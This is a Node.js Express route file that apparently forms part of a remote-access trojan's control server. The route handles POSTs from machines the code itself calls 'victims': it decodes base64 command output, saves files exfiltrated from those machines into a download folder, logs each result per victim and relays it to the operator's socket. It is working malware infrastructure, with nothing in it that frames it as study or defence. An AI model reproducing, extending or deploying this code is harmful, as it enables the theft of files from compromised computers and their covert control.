var express = require('express');
var router = express.Router();
var user_md = require('../models/user');
var victims_md = require('../models/victims');
var helper = require('../helpers/helper');
var fs = require('fs');

module.exports = function(sockets){
    router.post('/', function(req, res){
        var params = req.body;
        //console.log(params);
        var id = params.id;
        var message = params.ret;
        message = new Buffer(message, 'base64').toString('ascii');
        console.log(message);
        if(message == "download completed."){
            var name = params.name;
            var buf_file = params.buf;
            console.log(buf_file);
            buf_file = new Buffer(buf_file, 'base64');
            console.log(name);
            fs.writeFile('download/' + name, buf_file, function(err) {
               if(err) throw err;
            });
        }
        //add log to database
        var log = victims_md.getLogByID(id);

        if(log) {
            log.then(function(logs) {
                var log = logs[0].log;
                if (log) {
                    log = log + "\n" + message;
                } else {
                    log = message;
                }

                var update = victims_md.updateLogByID(id, log);

                if(update) {
                    update.then(function (result) {

                    }).catch(function (err) {
                        console.log('Can not update log by id');
                    });
                }
            }).catch(function (err) {
                console.log('Can not get log by id');
            });
        }

        //send response to socket
        var data = {
            message: message
        };
        sockets.forEach(function(socket) {
            if(socket.id == id){
                socket.emit("update_message", data);
            }
        });

        res.end("Response OK");
    });

    return router;
};

